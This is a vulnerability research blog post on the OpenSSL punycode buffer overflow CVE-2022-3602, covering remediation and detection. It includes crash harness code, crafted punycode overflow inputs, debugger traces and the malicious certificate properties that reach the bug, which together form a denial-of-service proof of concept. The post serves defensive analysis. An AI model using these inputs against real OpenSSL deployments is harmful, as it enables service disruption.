@@ -1,0 +1,432 @@
+
+On November 1, 2022, the OpenSSL Project released a security advisory detailing a high-severity vulnerability in the OpenSSL library. Deployments of OpenSSL from 3.0.0 to 3.0.6 (included) are vulnerable and are fixed in version 3.0.7. The vulnerability is tracked as CVE-2022-3602.
+In this blog post, we will provide:
+
+the main takeaways from Datadog Security Lab’s research into the vulnerability
+protection and detection recommendations
+our assessment of the vulnerability’s exploitability and impact as they relate to the scenarios necessary to reach the vulnerable code path
+a deep-dive technical analysis of the vulnerability, its exploit path, and our efforts in exploiting the vulnerability
+There is a lot of coverage of this vulnerability from sources such as news stories and social media posts, and information is changing quickly. We will update this blog as we discover more details via our own research and publicly available information.
+Notes:
+
+The vulnerability was initially pre-announced as “critical”, and later downgraded to “high”.
+The initial vulnerability pre-announced by OpenSSL is CVE-2022-3602. On November 1, the OpenSSL project announced that the 3.0.7 release also fixed another vulnerability, CVE-2022-3786. This post focuses on the initially announced vulnerability solely.
+Main takeaways
+
+The issue was reported to the OpenSSL Project on October 17, 2022.
+The vulnerability affects OpenSSL versions 3.0.0 (released in September 2021) to 3.0.6 (included).
+The vulnerability was fixed in version 3.0.7, released November 1, 2022.
+The vulnerable function patched in 3.0.7 requires a victim client or server to verify a maliciously crafted email address within an X.509 certificate.
+This vulnerability is likely not as open to widespread exploitation as HeartBleed due to the prerequisite that a client or server must be configured to verify a malicious email address within a certificate
+OpenSSL 3.x was released in September 2021, while 1.1.1 is an LTS version supported until September 2023. Use of OpenSSL 3.x is consequently not as widespread, which is likely to further limit exploitation of this vulnerability.
+Datadog has released a proof of concept (PoC) to crash a Windows deployment of vulnerable versions.
+Linux deployments are potentially vulnerable, but due to technical details discovered during our research, they may not be exploitable. There still is a possibility that an exploit crafted for Linux deployments emerges.
+OpenSSL 3.0.x users should upgrade to 3.0.7.
+Some application runtimes, such as Node.js, embed their own version of OpenSSL and need to be upgraded as well.
+OpenSSL 1.1.1 and 1.0.2 are NOT vulnerable.
+Description
+On November 1, 2022, the OpenSSL Project released a security bulletin detailing a vulnerability they deemed high severity. The vulnerability is a memory corruption bug that can be triggered when a vulnerable client or server validates an X.509 certificate. A specially crafted email address abusing non-ASCII codepoints in a client or server certificate could exploit this vulnerability to achieve denial of service (DoS) or remote code execution (RCE).
+An attacker could exploit the vulnerability in any situation where a vulnerable application verifies an untrusted X.509 certificate (including TLS certificates). In particular, this could involve:
+
+A malicious server sending a specially crafted TLS server certificate to a vulnerable client
+A malicious client sending a specially crafted client-side TLS to a vulnerable server requiring client-side TLS authentication
+The Datadog Security Labs team has replicated the vulnerable scenario on Windows and crafted a PoC that crashes OpenSSL on Windows. We replicated the same environment on Linux, where we have medium confidence that the vulnerability is not exploitable, due to a number of low-level technical details.
+Detection and remediation
+If you are using OpenSSL from 3.0.0 to 3.0.6 included, you should upgrade to 3.0.7.
+The Computer Emergency Response Team (CERT) for the Netherlands compiled a list of common operating systems and application runtimes packaged with a vulnerable version of OpenSSL.
+If your operating system comes with a vulnerable version of OpenSSL installed (e.g., Ubuntu 22.04 LTS or Amazon Linux 2022), any application dynamically loading the OpenSSL library is vulnerable as well. That’s typically the case of web servers like Nginx or Apache2 and interpreted languages such as PHP, Python, or Ruby.
+If you’re using an application runtime that packages its own OpenSSL version, such as Node.js 17.x, 18.x or 19.x, you need to upgrade the runtime itself. Upgrading the operating system openssl package is not enough.
+Other languages like Go use their own TLS implementation and do not leverage OpenSSL. Consequently, these are not affected. Rust applications need to be handled on a case-by-case basis, since they can either use the rustls implementation or the OpenSSL bindings using the system-wide version.
+For provider-specific guidance, refer to the specific security bulletins, such as the one from AWS.
+How Datadog can help
+The Datadog Security Platform lets you detect attacker behavior and identify threats within your cloud environment. Two features in particular can help you spot malicious activity by threat actors exploiting CVE-2022-3602.
+In the case that an exploit is created to perform remote code execution, Cloud Workload Security (CWS) has a number of out-of-the-box rules to detect post exploitation scenarios, including:
+
+Unfamiliar command spawned from web server
+Java process spawned shell
+Interactive shell spawned in container
+In the case that an exploit is used to create a DoS condition, Service Checks can help identify anomalous degradation or termination of services using vulnerable versions of OpenSSL.
+Vulnerability description
+The vulnerability exists in ossl_punycode_decode​​, a function that provides decoding functionality of punycode domain names. Punycode is specified in RFC3492 and is used to encode internationalized domain names from their Unicode representation to ASCII. For example, the “Latin Small Letter Alpha,” ɑ, is Unicode 0251. If we have a domain that uses “Latin Small Letter Alpha” in the domain, such as dɑtadog.com (the first a is the unicode character), it becomes an International Domain Name in Applications (IDNA) domain.
+Computers convert IDNA domains into punycode domains, so dɑtadog.com becomes xn--dtadog-bxc.com, where xn– specifies a punycode domain. Within OpenSSL, ossl_punycode_decode takes a string buffer of a punycode domain (with xn– removed) and converts it to Unicode for additional processing.
+This function is invoked when a client or server is configured to validate an X.509 certificate. An attacker can potentially exploit the vulnerability by creating a specially crafted certificate that contains punycode in the domain of the email address field.
+In order to reach this vulnerable function, the execution has to go through the following scenario:
+
+
+The Security Labs team created a vulnerable environment using the details from the advisory and began trying to trigger the path to cause a DoS condition. If you’d like to experiment with a vulnerable environment, check out our GitHub repository here.
+Exploitation technical details
+This section makes extensive references to stack cookies, a memory security mechanism designed to protect against stack buffer overflow attacks. A good summary of the topic from an offensive practitioner perspective can be found here.
+Having received the patch details and advisory that OpenSSL 3.0.6 is the latest vulnerable version, we pulled down the source code on our test Windows machine and compiled OpenSSL from source according to the instructions here. We used Windows for our initial assessment to take advantage of the excellent tooling for low-level exploitation, notably WinDBG Preview and Visual Studio. We started by examining the unit test added as part of the patch to better understand the high-level details of the vulnerability. The comments and  __debugbreak() statements that follow here are our own:
+static int test_puny_overrun(void)
+{
+    static const unsigned int out[] = {
+    0x0033, 0x5E74, 0x0042, 0x7D44, 0x91D1, 0x516B, 0x5148, // Expected result
+    0x751F                                                    // 4 byte overwrite
+    };
+    static const char* in = "3B-ww4c5e180e575a65lsy2b";
+    unsigned int buf[OSSL_NELEM(out)];
+    unsigned int bsize = OSSL_NELEM(buf) - 1; // NOTE: true size - 1
+
+    __debugbreak();
+    int result = ossl_punycode_decode(in, strlen(in), buf, &bsize);
+    // bsize = 8 (7 expected)
+    __debugbreak();
+    if (!TEST_false(result)) {
+        if (TEST_mem_eq(buf, bsize * sizeof(*buf), out, sizeof(out)))
+            // buffers match which means we have an overwrite of the 8th integer
+            TEST_error("CRITICAL: buffer overrun detected!");
+        return 0;
+
+    }
+    return 1;
+}
+By taking advantage of the existing test framework, we’ve compiled all of our OpenSSL tests into standalone .exe files under test/<test_name>.exe. This makes running an individual test case under a debugger (WinDBG) straightforward. Note that we feature x86 binaries in most examples for easier illustration, but we’ve been able to verify our results on 64-bit builds as well. The test above passes a punycode string to the ossl_punycode_decode function and checks that the output matches a precomputed buffer. Note that the out buffer contains 8 elements, the same number as are compared in TEST_mem_eq, but only a buffer size of 7 is passed to ossl_punycode_decode.
+Running the test on our vulnerable version of OpenSSL (3.0.6), we see that the test fails, which means that a 4-byte out-of-bounds write occurs on the passed-in stack buffer. The returned size is also set to the incorrect value (8). Note that the test has been specifically crafted to ensure a crash does not occur while validating the presence of the bug.
+Next, we look to the root cause of the vulnerability, which is revealed when looking at the source of ossl_punycode_decode alongside the patch:
+// Patched to (written_out >= max_out)
+        if (written_out > max_out)
+            return 0;
+
+        memmove(pDecoded + i + 1, pDecoded + i,
+                (written_out - i) * sizeof *pDecoded);
+        pDecoded[i] = n;
+        i++;
+        written_out++;
+    }
+
+    *pout_length = written_out;
+    return 1;
+This is an off-by-one bug in a loop termination condition, which translates into an integer overwrite. Looking at the values in the last pass of the loop under a debugger when running our test above, we get:
+// Local variable snapshot
+written_out = 7
+i = 4
+sizeof(*pDecoded) = sizeof(int) = 4
+
+// memmove(dst, src, nbytes) 
+memmove(pDecoded + 1 + 4 , pDecoded + 4, (7-4)*sizeof(int))
+memmove(pDecoded + 5, pDecoded + 4, 3*sizeof(int))
+Our passed-in pDecoded buffer is made up of 7*32-bit integers. We write 3*32-bit integers from the start of the buffer offset by 5*32-bit integers—this equates to a 1*32-bit integer overwrite past the end of the buffer.
+Now that we understand the root cause of the issue, we can modify the test case to cause an actual buffer overrun and (possibly) a crash. Our modified test case becomes:
+// Create a crash for developer provided input buffer
+static int test_puny_overrun_crash(void)
+{
+    char* in = "3B-ww4c5e180e575a65lsy2b";
+    unsigned int out[] = {
+    0x00,0x00,0x00,0x00,0x00,0x00,0x00,    // Only 7-bytes now!
+    };
+    
+    unsigned int bsize = OSSL_NELEM(out); // The actual size of our buffer
+
+    __debugbreak();
+    int result = ossl_punycode_decode(in, strlen(in), out, &bsize);
+    __debugbreak();
+
+    return 1;
+}
+If we examine the stack frame in our first __debugbreak() statement, then before the vulnerable function is executed, we have the expected layout:
+0:000> dps @esp
+00faedc8  00000007        // bsize
+00faedcc  00000000        // start of out buffer
+00faedd0  00000000
+00faedd4  00000000
+00faedd8  00000000
+00faeddc  00000000
+00faede0  00000000
+00faede4  00000000        // end of out buffer
+00faede8  08b675a5        // stack cookie
+00faedec  0023a92a punycode_test!run_tests+0x22a [c:\users\d0g\openssl\openssl\test\testutil\driver.c @ 334]
+Once the function has executed, we hit our second __debugbreak() and examine the stack frame again:
+0:000> dps @esp
+00faedc8  00000008         // bsize (note change to INCORRECT value)
+00faedcc  00000033        // start of out buffer
+00faedd0  00005e74
+00faedd4  00000042
+00faedd8  00007d44
+00faeddc  000091d1
+00faede0  0000516b        
+00faede4  00005148        // end of out buffer
+00faede8  0000751f         // OVERWRITTEN stack cookie
+00faedec  0023a92a punycode_test!run_tests+0x22a [c:\users\d0g\openssl\openssl\test\testutil\driver.c @ 334]
+The stack cookie has been overwritten with the result of our last decode loop operation. This is confirmed if we let the program continue execution:
+0:000> p
+WARNING: Continuing a non-continuable exception
+(1008.256c): Security check failure or stack buffer overrun - code c0000409 (!!! second chance !!!)
+Subcode: 0x2 FAST_FAIL_STACK_COOKIE_CHECK_FAILURE 
+eax=00000001 ebx=00000000 ecx=00000002 edx=000001f3 esi=00000000 edi=0034c504
+eip=003497c2 esp=00faea9c ebp=00faedc0 iopl=0         nv up ei pl nz na po nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00200202
+punycode_test!__report_gsfailure+0x17:
+003497c2 cd29            int     29h
+Now, we’ve found a DoS condition by using the integer overwrite to corrupt the stack cookie! But can we go further to achieve RCE? This is where things become tricky. We only have a 4-byte write after our buffer, and we have stack cookies to contend with due to the secure default compiler settings of the OpenSSL project. Exploitation could be possible, but it would require application code to use the function in a specific way and an attacker to perform significant follow-on exploit development work. A contrived example demonstrating an exploitable condition would look as follows:
+typedef int (*EmbeddedFunc)(void);
+
+struct contrived_example {
+    int decoded[7];
+    EmbeddedFunc ofc;
+};
+
+static int test_puny_overrun_rce(void)
+{
+    static const unsigned int out[] = {
+    0x0033, 0x5E74, 0x0042, 0x7D44, 0x91D1, 0x516B, 0x5148, 0x751F
+    };
+    static const char* in = "3B-ww4c5e180e575a65lsy2b";
+    struct contrived_example ex;
+    unsigned int bsize = OSSL_NELEM(ex.decoded);
+    ex.ofc = (EmbeddedFunc) &puts;
+
+    int result = ossl_punycode_decode(in, strlen(in), ex.decoded, &bsize);
+    __debugbreak();
+    ex.ofc("nothing to see here\n");
+    
+    return 1;
+}
+If we examine the state of execution prior to the __debugbreak() statement, we see the following:
+00:000> dt ex
+Local var @ 0x1bead0 Type contrived_example
+   +0x000 decoded          : [7] 0n51
+   +0x01c ofc              : 0x0000751f     int  +751f
+Here, our function pointer has been overwritten with the last integer of the decoding operation. If we let the program continue, we crash trying to execute unallocated memory:
+(4540.8834): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000001 ebx=00000000 ecx=00000000 edx=00000018 esi=00cac42d edi=00cac970
+eip=0000751f esp=001beab0 ebp=00000001 iopl=0         nv up ei pl nz ac pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210216
+0000751f ??              ???
+However, with some extra work—such as heap spraying—this could be the start of an RCE exploit chain. This example is a proof of concept, but could it be present in a real-world example? Or could we see a similar technique allowing an overwrite of a sensitive variable? A search of GitHub reveals that the vulnerable function only appears to be called from within OpenSSL itself, inside the ossl_a2ulabel function. Let’s examine this piece of code in more detail:
+unsigned int buf[LABEL_BUF_SIZE];      /* It's a hostname */
+    memset(buf, 0xdd, sizeof(buf));        // Set memory for cleaner visualization 
+
+    if (out == NULL)
+        result = 0;
+
+    while (1) {
+        char *tmpptr = strchr(inptr, '.');
+        size_t delta = (tmpptr) ? (size_t)(tmpptr - inptr) : strlen(inptr);
+
+        if (strncmp(inptr, "xn--", 4) != 0) {
+            size += delta + 1;
+
+            if (size >= *outlen - 1)
+                result = 0;
+
+            if (result > 0) {
+                memcpy(outptr, inptr, delta + 1);
+                outptr += delta + 1;
+            }
+        } else {
+            unsigned int bufsize = LABEL_BUF_SIZE;
+            unsigned int i;
+
+            if (ossl_punycode_decode(inptr + 4, delta - 4, buf, &bufsize) <= 0)
+                return -1;
+
+            for (i = 0; i < bufsize; i++) {
+                unsigned char seed[6];
+                size_t utfsize = codepoint2utf8(seed, buf[i]);
+                if (utfsize == 0)
+                    return -1;
+We see a very similar pattern to the earlier test, but the stack buffer is much bigger. We can try and trigger our vulnerability by passing in a punycode string that decodes to 513 elements, thus ensuring a buffer overwrite:
+#define A2ULABEL_SIZE 512
+static int test_puny_overrun_large(void)
+{
+    unsigned int outlen = A2ULABEL_SIZE;
+    // Should produce 513 sized output....
+    static const char* in = "3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2ba";
+    unsigned int out[A2ULABEL_SIZE];
+    memset(out, 0xdd, sizeof(out));
+
+    __debugbreak();
+    int result = ossl_punycode_decode(in, strlen(in), out, &outlen);
+    __debugbreak();
+
+    return 1;
+}
+This test successfully causes a crash, so we can create a harness on the vulnerable function itself:
+// Create an overwrite (no crash) in ossl_a2ulabel
+static int test_a2ulabel_overrun_large(void)
+{
+    unsigned int outlen = A2ULABEL_SIZE;
+    // Should produce 513 sized output....
+    static const char* in = "xn--3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2ba";
+    unsigned int out[A2ULABEL_SIZE];
+
+    __debugbreak();
+    int result = ossl_a2ulabel(in, out, &outlen);
+    __debugbreak();
+
+    return 1;
+}
+Once again, when examining the stack frames between the __debugbreak() statements, we see a successful overwrite of the stack cookie. (NOTE: we introduce a memset operation to fill the contents of our buffer with 0xdd to help with visualizing the behavior.) We confirmed results on both x86 and x64 release builds. The initial stack frame looks as follows:
+0:000>  dps @rsp + (4*200)
+000000b5`4c2fe4d0  dddddddd`dddddddd
+000000b5`4c2fe4d8  dddddddd`dddddddd
+000000b5`4c2fe4e0  dddddddd`dddddddd
+000000b5`4c2fe4e8  dddddddd`dddddddd
+000000b5`4c2fe4f0  dddddddd`dddddddd
+000000b5`4c2fe4f8  dddddddd`dddddddd
+000000b5`4c2fe500  dddddddd`dddddddd
+000000b5`4c2fe508  dddddddd`dddddddd // end of buffer
+000000b5`4c2fe510  00005133`4b2382d3 // cookie
+000000b5`4c2fe518  00007ff7`e44fcce2 punycode_test!ossl_a2ulabel+0x22 [c:\users\d0g\openssl\openssl\crypto\punycode.c @ 249]
+Here is the stack frame after the vulnerable function call:
+0:000>  dps @rsp + (4*200)
+000000b5`4c2fe4d0  00000065`00000030
+000000b5`4c2fe4d8  00000037`00000035
+000000b5`4c2fe4e0  00000061`00000035
+000000b5`4c2fe4e8  00000035`00000036
+000000b5`4c2fe4f0  00000073`0000006c
+000000b5`4c2fe4f8  00000032`00000079
+000000b5`4c2fe500  000001c6`000001c6
+000000b5`4c2fe508  00000033`00000062
+000000b5`4c2fe510  00005133`00000042 // cookie partially OVERWRITTEN
+000000b5`4c2fe518  00007ff7`e44fcce2 punycode_test!ossl_a2ulabel+0x22 [c:\users\d0g\openssl\openssl\crypto\punycode.c @ 249]
+Now we have proven that we can trigger a DoS via controlled input to ossl_a2ulabel. How do we pass input to this function as an external caller?
+Exploit scenarios
+As described previously, there is a complex chain of function calls to reach the vulnerable ossl_punycode_decode function. As a part of that chain, the OpenSSL library attempts to validate name constraints of the certificate passed in. A name constraint is a part of a certificate which specifies a namespace in which all subsequent certificates must be located. This is relevant to our exploitation as the nc_match function (name constraint match) has the following code:
+/*
+     * We need to compare not gen->type field but an "effective" type because
+     * the otherName field may contain EAI email address treated specially
+     * according to RFC 8398, section 6
+     */
+    int effective_type = ((gen->type == GEN_OTHERNAME) &&
+                          (OBJ_obj2nid(gen->d.otherName->type_id) ==
+                           NID_id_on_SmtpUTF8Mailbox)) ? GEN_EMAIL : gen->type;
+Here, we see that the type of the name constraint is checked for its “effective” type. This type is then used later on to determine if the nc_match_single function is invoked. In that function, we see another check:
+case GEN_OTHERNAME:
+         /*
+         * We are here only when we have SmtpUTF8 name,
+         * so we match the value of othername with base->d.rfc822Name
+         */
+        return nc_email_eai(gen->d.otherName->value, base->d.rfc822Name);
+Again, we are checking for a situation where the type of the name constraint is otherName. From the comment, we get a helpful clue that We are here only when we have an SmtpUTF8 name. If we do, we invoke the nc_email_eai function, which in turn invokes the familiar ossl_a2ulabel function.
+if (ossl_a2ulabel(baseptr, ulabel, &size) <= 0) {
+        ret = X509_V_ERR_UNSPECIFIED;
+        goto end;
+    }
+With these requirements in mind, there are a few different ways we can reach the vulnerable function. The simplest scenario would be one in which there is a vulnerable server parsing client-side TLS certificates. An attacker could craft a malicious client certificate that has the following properties.
+
+The certificate has a subjectAltName that specifies an otherName with a SmtpUTF8 email address.
+The certificate has a nameConstraint with an email address that includes punycode (as described in the previous section).
+These two things combined would allow an attacker to supply an X.509 certificate to a vulnerable server and reach the vulnerable ossl_punycode_decode function. The client certificate name constraint would include the payload that decodes to 513 bytes to overflow the buffer.
+Linux exploitation methodology
+Following our relative success on the Windows platform, we attempted to recreate the findings on various Linux distributions. Despite our PoC reliably crashing OpenSSL on Windows, we were unable to reproduce this on any of the Linux binaries available. To investigate this further, we recompiled the OpenSSL 3.0.6 source on an Ubuntu 20.04 VM using GCC and attempted to reproduce our earlier analysis.
+Running our test_a2ulabel_overrun_large test from earlier using GDB, we hit our usual first breakpoint to examine the stack just before the invocation of our vulnerable ossl_punycode_decode function:
+Breakpoint 3, ossl_a2ulabel (
+    in=0x55555586f3a0 "xn--3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-w"..., out=0x7fffffffcc00 "", outlen=0x7fffffffcbf8) at crypto/punycode.c:291
+291                 for (i = 0; i < bufsize; i++) {
+
+(gdb) x/40x $rsp +(4*0x200)
+0x7fffffffcb70: 0xdddddddddddddddd      0xdddddddddddddddd
+0x7fffffffcb80: 0xdddddddddddddddd      0xdddddddddddddddd
+0x7fffffffcb90: 0xdddddddddddddddd      0xdddddddddddddddd
+0x7fffffffcba0: 0xdddddddddddddddd      0xdddddddddddddddd
+0x7fffffffcbb0: 0xdddddddddddddddd      0xdddddddddddddddd
+0x7fffffffcbc0: 0xdddddddddddddddd      0xdddddddddddddddd    // end of buffer
+0x7fffffffcbd0: 0x0000000000000000      0x888f2581fcdea900    // stack cookie
+0x7fffffffcbe0: 0x00007fffffffd410      0x00005555555b85a4
+We can immediately see that the stack layout is different here. We observe 4 bytes of padding between the end of our buffer and the stack cookie (0x7fffffffcbd0). After executing the vulnerable function, we examine the stack again:
+(gdb) x/40x $rsp +(4*0x200)
+0x7fffffffcb70: 0x0000007700000077      0x0000006300000034
+0x7fffffffcb80: 0x0000006500000035      0x0000003800000031
+0x7fffffffcb90: 0x0000006500000030      0x0000003700000035
+0x7fffffffcba0: 0x0000006100000035      0x0000003500000036
+0x7fffffffcbb0: 0x000000730000006c      0x0000003200000079
+0x7fffffffcbc0: 0x000001c6000001c6      0x0000003300000062     // end of buffer
+0x7fffffffcbd0: 0x0000000000000042      0x888f2581fcdea900     // INTACT stack cookie
+0x7fffffffcbe0: 0x00007fffffffd410      0x00005555555b85a4
+We can see that our overwrite is not corrupting the stack cookie, but instead altering a local stack variable (0x7fffffffcbd0). This could be good news if the variable is of consequence to the logic of the program. Using GDB, we can determine which variable matches the address:
+(gdb) info locals
+seed = "\000\000\000\000\000"
+utfsize = 0
+bufsize = 513
+i = 0
+tmpptr = 0x0
+delta = 533
+outptr = 0x7fffffffcc00 ""
+inptr = 0x55555586f3a0 "xn--3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-ww4c5e180e575a65lsy2b3B-w"...
+size = 0
+result = 1
+buf = {52...}
+
+(gdb) p seed
+$3 = "\000\000\000\000\000"
+(gdb) p &seed
+$4 = (unsigned char (*)[6]) 0x7fffffffcbd2
+However, we see that the overwritten variable is seed from the snippet below. Our corruption occurs before the variable is initialized and will therefore have no effect on the flow of the program:
+if (ossl_punycode_decode(inptr + 4, delta - 4, buf, &bufsize) <= 0)
+                return -1;
+
+            for (i = 0; i < bufsize; i++) {
+                unsigned char seed[6];    // Corrupted variable. Not yet initialized
+                size_t utfsize = codepoint2utf8(seed, buf[i]);
+                if (utfsize == 0)
+                    return -1;
+We wanted to understand the root cause of the difference between Windows and Linux. We examined the disassembly of two different binaries:
+
+Windows 64-bit - OpenSSL 3.0.6 - Source compilation (Default Configuration)
+Linux 64-bit - OpenSSL 3.0.2 - Ubuntu 22.04 Binary
+We found that In the first case, the seed variable was not created on the stack due to a compiler optimization. Thus, the stack cookie is placed directly after our vulnerable buffer, and a single byte overwrite causes a crash. In the second case,  seed is created on the stack between our buffer and the stack cookie. Our overwrite simply sets an uninitialized variable with no effect.
+Exploit conclusion
+We were able to demonstrate that this vulnerability can be exploited to trigger a denial of service (DoS) condition on the following platforms:
+
+Windows 64-bit - OpenSSL 3.0.6 - Source compilation (Default Configuration)
+Windows 32-bit - OpenSSL 3.0.6 - Source compilation (Default Configuration)
+As outlined in the “Technical details” section, the conditions for DoS depend on compiler optimizations occuring during compilation of the ossl_a2ulabel function. We were able to determine with medium confidence that the following were unlikely to be exploitable:
+
+Linux 64-bit - OpenSSL 3.0.6 - Source compilation (Default Configuration)
+Linux 64-bit - OpenSSL 3.0.2 - Ubuntu 22.04 Binary
+We were not able to exploit the vulnerability to achieve code execution, its nature making such an exploitation quite complex.
+Because OpenSSL is distributed as source, rather than binary releases, we are unable to make a general determination on the exploitability of DoS across the ecosystem.
+Notes on exploitability leading to RCE
+Security protections against buffer overflows have evolved significantly in the past decade. ASLR, NX stack, stack cookies (aka canaries), SafeSEH, and platform-specific protections (CFG et al.) have made exploitation of stack buffer overflows extremely tricky to pull off. Given the constrained write primitive available here, we believe gaining full RCE would be complex to achieve through this vulnerability.
+Exploitation for DoS depends heavily on the particular stack layout within the ossl_a2ulabel function. For example, when compiling OpenSSL under debug (vs. release) mode in Windows, we could not trigger a crash, as our overwrite corrupted an uninitialized buffer that had no detrimental effects on the program. Furthermore, OpenSSL is distributed as source rather than precompiled binaries, so exploitability conditions could vary based on compiler settings such as optimization settings and disabling stack cookies. Note that the above factors do also leave open the possibility that RCE could be achieved for certain distributions.
+Conclusion
+This OpenSSL vulnerability can be used to cause denial of service (DoS), and potentially remote code execution (RCE). In this post, we provided some background on the vulnerability and a technical analysis on how it can be exploited. Applications that currently use OpenSSL versions 3.0.0 to 3.0.6 should upgrade to 3.0.7.
+While this OpenSSL vulnerability may be complex for attackers to exploit, threat actors have grown increasingly sophisticated, making a proactive approach to detection and protection a must.
+We will update this blog post as we or the community discovers more information related to vulnerability details or threat actor activity attempting to scan or exploit CVE-2022-3602.
+Datadog customers can easily detect post exploitation activity with Cloud Workload Security to start securing their environment. If you aren’t already a Datadog customer, start with a free 14-day trial today.
+Acknowledgements
+Thank you to Zack Allen, Jb Aviat, Andrew Krug, Jesse Mack, Christophe Tafani-Dereeper, and Izar Tarandach, all of who contributed to the making of this post.
+Updates made to this entry
+openssl
+dɑtadog.com
+dɑtadog.com
+xn--dtadog-bxc.com
+xn–
+ossl_punycode_decode
+xn–
+__debugbreak()
+test/<test_name>.exe
+ossl_punycode_decode
+out
+TEST_mem_eq
+ossl_punycode_decode
+ossl_punycode_decode
+pDecoded
+__debugbreak()
+__debugbreak()
+__debugbreak()
+ossl_a2ulabel
+__debugbreak()
+memset
+0xdd
+ossl_a2ulabel
+ossl_punycode_decode
+otherName
+We are here only when we have an SmtpUTF8 name
+subjectAltName
+otherName
+SmtpUTF8
+nameConstraint
+ossl_punycode_decode
+test_a2ulabel_overrun_large
+ossl_punycode_decode
+0x7fffffffcbd0
+0x7fffffffcbd0
+seed
+seed
+seed
+ossl_a2ulabel function
+ossl_a2ulabel
